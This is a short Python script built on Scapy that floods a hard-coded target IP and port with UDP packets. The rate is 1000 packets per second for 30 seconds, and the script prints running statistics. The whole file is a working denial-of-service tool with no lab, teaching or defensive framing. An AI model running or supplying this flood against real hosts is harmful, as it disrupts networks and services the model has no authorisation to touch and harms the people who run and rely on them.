#!/usr/bin/env python

from scapy.all import IP, UDP, Raw, send
import time
import sys
import os

# ------------------- CONFIG -------------------
TARGET_IP   = "100.90.3.86"   
TARGET_PORT = 12345             # any high‑port that is not used
PACKET_RATE = 1000              # packets per second
DURATION    = 30                # seconds to run
PAYLOAD     = b"A" * 100        # 100‑byte payload 
# ---------------------------------------------

def main():
    print(f"[+] UDP flood → {TARGET_IP}:{TARGET_PORT}")
    print(f"    Rate: {PACKET_RATE} pps | Duration: {DURATION}s | Payload: {len(PAYLOAD)} B")

    pkt = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT) / Raw(load=PAYLOAD)

    sent = 0
    start = time.time()
    next_stat = start + 1

    try:
        while time.time() - start < DURATION:
            send(pkt, verbose=0)
            sent += 1

            # ---- rate limiting ----
            elapsed = time.time() - start
            should_be = int(elapsed * PACKET_RATE)
            if sent > should_be:
                time.sleep((sent - should_be) / PACKET_RATE)

            # ---- live stats ----
            if time.time() >= next_stat:
                print(f"    Sent {sent:,} pkts | {sent/elapsed:,.1f} pps")
                next_stat += 1

    except KeyboardInterrupt:
        print("\n[!] Stopped by user")

    total_time = time.time() - start
    print(f"\n[+] Flood finished")
    print(f"    Total packets : {sent:,}")
    print(f"    Time          : {total_time:.2f}s")
    print(f"    Avg rate      : {sent/total_time:,.1f} pps")

if __name__ == "__main__":
    main()